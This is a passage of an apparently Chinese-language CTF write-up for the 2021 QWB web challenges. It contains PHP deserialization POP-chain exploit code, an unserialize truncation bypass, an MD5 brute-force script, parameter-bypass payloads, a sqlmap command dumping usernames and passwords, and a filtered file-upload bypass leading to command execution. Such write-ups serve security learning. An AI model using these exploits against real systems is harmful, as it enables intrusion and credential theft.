data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623677433702-0a93c448-ba3f-473e-8ff6-f347d3de328c.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>就绕过去了</p><p>6月24日更新</p><hr><p>从Nu1L的wp中看到的另外一种绕过方法，POC如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myclass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> myclass();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Hello();</span><br><span class="line"><span class="variable">$b</span>-&gt;qwb = <span class="string">&quot;e2a7106f1cc8bb1e1318df70aa0a3540.php&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;test = <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$raw_exp</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(substr(<span class="variable">$raw_exp</span>, <span class="number">0</span>, strlen(<span class="variable">$raw_exp</span>) - <span class="number">1</span>));</span><br></pre></td></tr></table></figure><p>即去除了序列化后数据最后一个花括号，能正常反序列化，但因序列化数据最后一位有误，<code>unserialize</code> 执行出现异常， <code>$res</code> 为 <code>false</code>，所以绕过了正则表达式</p><p><img src="/img/2021qwb/image-20210624231406764.png" class="lazyload" data-srcset="/img/2021qwb/image-20210624231406764.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210624231406764"></p><p>本地中 <code>e2a7106f1cc8bb1e1318df70aa0a3540.php</code> 文件内容为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$hint</span> = <span class="string">&#x27;hint&#x27;</span>;</span><br></pre></td></tr></table></figure><p>正常读取文件内容</p><h2 id="0x4-强网先锋-赌徒"><a href="#0x4-强网先锋-赌徒" class="headerlink" title="0x4 [强网先锋]赌徒"></a>0x4 [强网先锋]赌徒</h2><p>by <a href="https://tari.moe/">tari</a></p><p>目录爆破 -&gt; <a href="http://www.zip/">www.zip</a> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//hint is in hint.php</span></span><br><span class="line">error_reporting(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&#x27;syst3m(&quot;cat 127.0.0.1/etc/hint&quot;);&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;I think you need /etc/hint . Before this you need to see the source code&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_sayhello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hi&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sayhello();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$cc</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;give you flag : &quot;</span>.<span class="keyword">$this</span>-&gt;flag;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$phonenumber</span>=<span class="number">123123</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$promise</span>=<span class="string">&#x27;I do&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;promise=<span class="string">&#x27;I will not !!!!&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;promise;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file[<span class="string">&#x27;filename&#x27;</span>]-&gt;ffiillee[<span class="string">&#x27;ffiilleennaammee&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Room</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sth_to_set</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_hint</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$hint</span>=base64_encode(file_get_contents(<span class="variable">$file</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$hint</span>;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="keyword">$this</span>-&gt;Get_hint(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]))&#123;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$hi</span> = <span class="keyword">new</span>  Start();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>调用逻辑为，反序列化调用 <code>Start</code> 类的 <code>__wakeup</code> 魔术方法 -&gt; 调用 <code>$this-&gt;_sayhello();</code> ，里面有 echo，可以触发 <code>Info</code> 类的 <code>__toString</code> 魔术方法，然后 <code>Room</code> 类无 <code>ffiillee[&#39;ffiilleennaammee&#39;]</code> 属性，进而触发 <code>__get</code> 魔术方法，最好先构造后 <code>Room</code> 类 <code>$a</code> 成员为 <code>Room</code> 对象即可（这里的坑为 <code>$a</code> 成员的 <code>Room</code> 对象不能在构造方法里构造，否则因这三个类相互调用而报错）</p><p>构造 POP链</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$phonenumber</span> = <span class="number">123123</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$promise</span> = <span class="string">&#x27;Ido&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Room</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sth_to_set</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$st</span> = <span class="keyword">new</span> Start();</span><br><span class="line"><span class="variable">$if</span> = <span class="keyword">new</span> Info();</span><br><span class="line"><span class="variable">$ro</span> = <span class="keyword">new</span> Room();</span><br><span class="line"><span class="variable">$st</span>-&gt;name = <span class="variable">$if</span>;</span><br><span class="line"><span class="variable">$if</span>-&gt;file[<span class="string">&#x27;filename&#x27;</span>] = <span class="variable">$ro</span>;</span><br><span class="line"><span class="variable">$ro</span>-&gt;a = <span class="keyword">new</span> Room();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$st</span>));</span><br></pre></td></tr></table></figure><p>注意这个 hi，不是base64编码后的，注意去掉~</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623501123432-ba8f3381-5ade-49b9-9819-77a64eff68ba.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623501123432-ba8f3381-5ade-49b9-9819-77a64eff68ba.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>得到flag</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623501387713-02b0214b-b7ab-4992-bd15-24ce5cd8a9f1.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623501387713-02b0214b-b7ab-4992-bd15-24ce5cd8a9f1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="0x5-强网先锋-寻宝"><a href="#0x5-强网先锋-寻宝" class="headerlink" title="0x5 [强网先锋]寻宝"></a>0x5 [强网先锋]寻宝</h2><h3 id="key1"><a href="#key1" class="headerlink" title="key1"></a>key1</h3><p>by <a href="https://tari.moe/">tari</a></p><ol><li>数字大于 1026即可</li><li>科学计数法绕过</li><li>跑一下脚本即可</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;4bf21cd&#x27;</span></span><br><span class="line">candidate = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    plaintext = <span class="built_in">str</span>(candidate)</span><br><span class="line">    <span class="built_in">hash</span> = hashlib.md5(plaintext.encode(<span class="string">&#x27;ascii&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hash</span>[:<span class="number">7</span>] == target:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;plaintext:&quot;&#x27;</span> + plaintext + <span class="string">&#x27;&quot;, md5:&#x27;</span> + <span class="built_in">hash</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    candidate = candidate + <span class="number">1</span></span><br></pre></td></tr></table></figure><ol><li>浮点数绕过</li><li>让json解析失败即可</li></ol><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ppp[number1]=1026a&amp;ppp[number2]=10e8&amp;ppp[number3]=61823470&amp;ppp[number4]=0.00000.0&amp;ppp[number5]=&#123;\&quot;a&quot;:1&#125;</span><br></pre></td></tr></table></figure><p>key1</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623512478985-f783a71b-4fc7-4ccb-bf54-a4b143b5ce75.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623512478985-f783a71b-4fc7-4ccb-bf54-a4b143b5ce75.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>KEY1{e1e1d3d40573127e9ee0480caf1283d6}</p><h3 id="key2"><a href="#key2" class="headerlink" title="key2"></a>key2</h3><p><a href="https://www.yuque.com/challenger-sfhjb">challenger</a> 来了句，有没有可能直接在文件里呢？</p><p>脚本安排上</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> docx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dir_file</span>(<span class="params">file_path</span>):</span></span><br><span class="line">    file_list = []</span><br><span class="line">    <span class="keyword">for</span> top, dirs, non_dirs <span class="keyword">in</span> os.walk(file_path):</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> non_dirs:</span><br><span class="line">            file_list.append(os.path.join(top, item))</span><br><span class="line">    <span class="keyword">return</span> file_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docx_list = <span class="built_in">filter</span>(<span class="keyword">lambda</span> s: s.endswith(<span class="string">&#x27;.docx&#x27;</span>), dir_file(<span class="string">&#x27;/Users/tari/Downloads/five_month&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> docx_file <span class="keyword">in</span> docx_list:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        docx_object = docx.Document(docx_file)</span><br><span class="line">    <span class="keyword">except</span> docx.opc.exceptions.PackageNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;open failed: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(docx_file))</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">for</span> para <span class="keyword">in</span> docx_object.paragraphs:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;KEY2&quot;</span> <span class="keyword">in</span> para.text:</span><br><span class="line">            <span class="built_in">print</span>(docx_file)</span><br><span class="line">            <span class="built_in">print</span>(para.text)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>key2</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623540905046-1412447f-9279-4866-9a92-52ff7b6382bc.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623540905046-1412447f-9279-4866-9a92-52ff7b6382bc.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>KEY2{T5fo0Od618l91SlG6l1l42l3a3ao1nblfsS}</p><p>提交两个key即可获得 flag</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623540965332-13431beb-7444-4827-927f-8f1bee789233.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623540965332-13431beb-7444-4827-927f-8f1bee789233.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="0x6-EasyWeb"><a href="#0x6-EasyWeb" class="headerlink" title="0x6 EasyWeb"></a>0x6 EasyWeb</h2><p>by <a href="https://www.yuque.com/challenger-sfhjb">challenger</a></p><p>目录爆破 -&gt; /hint</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623501942263-5d8a4617-2ac7-40dc-bb4d-b153d2fb97b6.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623501942263-5d8a4617-2ac7-40dc-bb4d-b153d2fb97b6.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>访问一下得到提示</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623502087269-acc39372-1f6d-4611-a863-2dd98b188a7f.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623502087269-acc39372-1f6d-4611-a863-2dd98b188a7f.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>尝试扫描 35000-40000端口</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623502207351-bf340032-e7d3-4bd5-9815-84869a122daa.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623502207351-bf340032-e7d3-4bd5-9815-84869a122daa.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>访问发现是个后台</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623502592028-f285e332-98f3-4223-be07-f6361220e074.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623502592028-f285e332-98f3-4223-be07-f6361220e074.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>貌似存在sql注入</p><p>sqlmap还可以直接跑出来</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623502969651-8689fdc0-800b-48c1-93c8-b7f66588741d.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623502969651-8689fdc0-800b-48c1-93c8-b7f66588741d.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sql.log -D easyweb -T employee -C username,passwd</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623502962765-c5393885-8b88-4eb3-acf6-5d974593ee10.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623502962765-c5393885-8b88-4eb3-acf6-5d974593ee10.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>帐号密码 admin/99f609527226e076d668668582ac4420</p><p>暂时没找到 ssrf 点在哪</p><p>不过找到一个文件上传点</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623552487546-9adf1ac1-1deb-4900-a010-974a9606a121.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623552487546-9adf1ac1-1deb-4900-a010-974a9606a121.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>过滤了一些字段，不过可以字符串拼接</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623554057612-ad3fa48a-4092-47fb-82dd-1f97f3a6ee25.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623554057612-ad3fa48a-4092-47fb-82dd-1f97f3a6ee25.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>whoami 是 www-data 然后flag没权限</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623554064212-f6e071cd-7eab-46a9-9cde-3fea6249cad2.png" class="lazyload" 